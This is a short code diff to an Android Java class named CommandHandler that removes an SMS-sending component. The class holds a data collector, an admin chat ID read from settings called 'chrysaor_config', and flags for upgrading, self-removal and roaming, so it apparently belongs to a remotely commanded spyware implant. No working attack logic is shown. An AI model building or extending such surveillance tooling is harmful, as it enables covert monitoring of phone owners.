@@ -15,7 +15,6 @@ public class CommandHandler {
     private static final String TAG = "CommandHandler";
     private Context context;
     private DataCollector dataCollector;
-    private SmsSender smsSender;
     private String adminChatId;
     private boolean isUpgrading = false, isRemoving = false, isRoaming = false, allowRoaming = false;
     private ExecutorService executor = Executors.newSingleThreadExecutor();
@@ -23,7 +22,6 @@ public class CommandHandler {
     public CommandHandler(Context context) {
         this.context = context.getApplicationContext();
         this.dataCollector = new DataCollector(context);
-        this.smsSender = new SmsSender(context);
         SharedPreferences prefs = context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE);
         this.adminChatId = prefs.getString("admin_chat_id", "admin");
         this.isUpgrading = prefs.getBoolean("is_upgrading", false);
